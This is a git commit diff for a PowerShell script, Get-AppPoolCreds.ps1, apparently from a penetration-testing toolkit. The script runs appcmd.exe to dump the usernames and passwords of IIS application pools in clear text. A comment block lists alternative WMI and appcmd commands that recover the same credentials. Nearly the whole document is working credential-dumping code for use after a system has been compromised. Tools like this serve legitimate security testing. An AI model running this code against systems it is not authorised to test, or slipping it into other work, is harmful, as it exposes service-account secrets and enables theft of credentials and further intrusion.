aa672de893f98431cb86ebd6d65b3c467c947f00
nullbind <scott.sutherland@nullbind.com>
2013-11-12 11:56:45 -0600

    small update

--- PowerShellery/Get-AppPoolCreds.ps1
+++ PowerShellery/Get-AppPoolCreds.ps1
@@ -4,27 +4,58 @@
 	
 	.NOTES
 	Must be run as administrator.
-	Requires Powershell version 3 or above.
 #>
 
-#List available modules
-$modules = get-module -listavailable | select name | foreach {
-	
-	#Check if the WebAdministration is available
-	if( $_.name -eq "WebAdministration")
-	{
-		# Import module
-		import-module WebAdministration 
-		
-		# Recover application pool credentials
-		Get-WMIObject -Namespace root\WebAdministration -Class ApplicationPool | Foreach { $I = $_.Name + " - " + $_.ProcessModel.UserName + " - " + $_.ProcessModel.Password; $I }
+# Command to dump IIS application pool configurations from applicationHost.config
+$MyPools = c:\windows\system32\inetsrv\appcmd.exe list apppool
+$MyPoolsConfigs = c:\windows\system32\inetsrv\appcmd.exe list apppool /text:* 
+
+# Display status summary to user
+$MyPoolCount = $MyPools.count
+Write-Host " "
+Write-Host "Found $MyPoolCount IIS application pools"
+Write-Host "Dumping IIS application pool credentials in clear text..."
+Write-Host " "
+
+$MyPoolsConfigs | foreach {
+
+	# Display application pool name
+	if($_ -like "*APPPOOL.NAME*")  
+	{	
+		Write-Host "------------------------------------"
+		write-host $_
 	}
-}
+	
+	# Display username for application pool
+	if($_ -like "*username*")  
+	{
+		write-host $_
+	}
+	
+	# Display password for application pool
+	if($_ -like "*password*")  
+	{
+		write-host $_
+	}
+} 
+Write-Host "------------------------------------"
+Write-Host " "
 
-# OS commands looks like....
-# c:\windows\system32\inetsrv\appcmd.exe list apppool /text:*
-# c:\windows\system32\inetsrv\appcmd.exe list apppool /text:processModel.username
-# c:\windows\system32\inetsrv\appcmd.exe list apppool /text:processModel.password
+<#
+Below are things I would like to build out in the future.
 
-# get the app pool name for each iis worker process
-#Get-WmiObject –class win32_process -filter 'name="w3wp.exe"' | Select-Object –Property Name, ProcessId, @{n='AppPool';e={$_.GetOwner().user}} 
+# Import module
+import-module WebAdministration 
+		
+# Recover application pool credentials
+Get-WMIObject -Namespace root\WebAdministration -Class ApplicationPool | Foreach { $I = $_.Name + " - " + $_.ProcessModel.UserName + " - " + $_.ProcessModel.Password; $I }
+
+# OS commands option look like the following
+c:\windows\system32\inetsrv\appcmd.exe list apppool /text:*
+c:\windows\system32\inetsrv\appcmd.exe list apppool /text:processModel.username
+c:\windows\system32\inetsrv\appcmd.exe list apppool /text:processModel.password
+
+# Get the app pool name for each IIS worker process
+Get-WmiObject –class win32_process -filter 'name="w3wp.exe"' | Select-Object –Property Name, ProcessId, @{n='AppPool';e={$_.GetOwner().user}} 
+
+#>
